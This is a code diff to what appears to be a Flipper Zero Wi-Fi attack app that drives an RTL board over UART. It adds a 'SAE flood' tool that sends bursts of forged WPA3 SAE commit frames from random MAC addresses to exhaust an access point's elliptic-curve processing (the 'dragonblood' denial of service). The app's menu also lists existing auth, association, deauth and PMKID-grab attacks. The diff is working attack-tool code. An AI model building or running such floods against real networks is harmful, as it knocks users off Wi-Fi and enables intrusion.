@@ -350,6 +350,7 @@ typedef enum {
 #define TOOL_PICKAP  20
 #define TOOL_AUTHFLOOD  21
 #define TOOL_ASSOCFLOOD 22
+#define TOOL_SAEFLOOD   23
 
 // Deferred GUI events posted from the UART worker thread (GUI must run on the GUI thread).
 #define DELFY_EVT_RECON 0x2000
@@ -1440,6 +1441,31 @@ static void delfy_flood(delfyRTL* app, bool with_assoc) {
     }
 }
 
+// B4: WPA3 SAE commit flood. Every frame is an Authentication frame with algorithm 3 and sequence 1
+// carrying a random - therefore invalid - scalar and curve element, and each one comes from a
+// different MAC, so the AP has to run the elliptic-curve work for every single one before it can
+// reject it (the "dragonblood" denial of service). A WPA2-only AP simply ignores the frames; the
+// effect needs a WPA3 or transition-mode AP, and it is a DoS against the AP itself, so own network.
+static void delfy_saeflood(delfyRTL* app) {
+    int ch;
+    char hex[13];
+    delfy_sel_ap(app, &ch, hex);
+    if(hex[0] == '\0') {
+        snprintf(popupHeader, sizeof(popupHeader), "SAE flood");
+        snprintf(message, sizeof(message), "Pick an AP first (List Wifi)");
+        scene_manager_next_scene(app->scene_manager, popupScene);
+        return;
+    }
+    char cmd[64];
+    snprintf(cmd, sizeof(cmd), "SAEFLOOD %s %d 96\n", hex, ch);
+    uart_helper_send(app->uart_helper, cmd, strlen(cmd));
+    {
+        char b[48];
+        snprintf(b, sizeof(b), "ch %d, 96 commits", ch);
+        delfy_busy(app, "SAE flood", b);
+    }
+}
+
 static void delfy_deauth_add(delfyRTL* app) {
     int ch;
     char hex[13];
@@ -2039,6 +2065,7 @@ static void tools_item_callback(void* context, uint32_t index) {
     case TOOL_BTM: delfy_btm(app); break;
     case TOOL_AUTHFLOOD: delfy_flood(app, false); break;
     case TOOL_ASSOCFLOOD: delfy_flood(app, true); break;
+    case TOOL_SAEFLOOD: delfy_saeflood(app); break;
     case TOOL_PICKAP: scene_manager_next_scene(app->scene_manager, pickApScene); break;
     case TOOL_PMKID: delfy_start_pmkid(app, false); break;
     case TOOL_PKGRAB: delfy_start_pmkid(app, true); break;
@@ -2123,6 +2150,9 @@ void tools_menu_scene_on_enter(void* context) {
     if(delfy_has_cap(app, 'F')) {
         submenu_add_item(app->submenu, "Auth flood (this AP)", TOOL_AUTHFLOOD, tools_item_callback, app);
         submenu_add_item(app->submenu, "Assoc+sleep flood (this AP)", TOOL_ASSOCFLOOD, tools_item_callback, app);
+    }
+    if(delfy_has_cap(app, 'A')) {
+        submenu_add_item(app->submenu, "SAE flood (this AP)", TOOL_SAEFLOOD, tools_item_callback, app);
     }
     view_dispatcher_switch_to_view(app->view_dispatcher, toolsListView);
 }
@@ -4422,7 +4452,8 @@ void uart_process_line(FuriString* line, void* context) {
         strncmp(furi_string_get_cstr(line), "CSASTAS:", 8) == 0 ||
         strncmp(furi_string_get_cstr(line), "BTMSTAS:", 8) == 0 ||
         strncmp(furi_string_get_cstr(line), "AUTHFLOOD:", 10) == 0 ||
-        strncmp(furi_string_get_cstr(line), "ASSOCFLOOD:", 11) == 0) {
+        strncmp(furi_string_get_cstr(line), "ASSOCFLOOD:", 11) == 0 ||
+        strncmp(furi_string_get_cstr(line), "SAEFLOOD:", 9) == 0) {
         // The board confirms a management-action burst. Only the unicast (second) pass is
         // watched: BTM/CSA always print their own line first, and two popups would stack.
         snprintf(message, sizeof(message), "%s", furi_string_get_cstr(line));
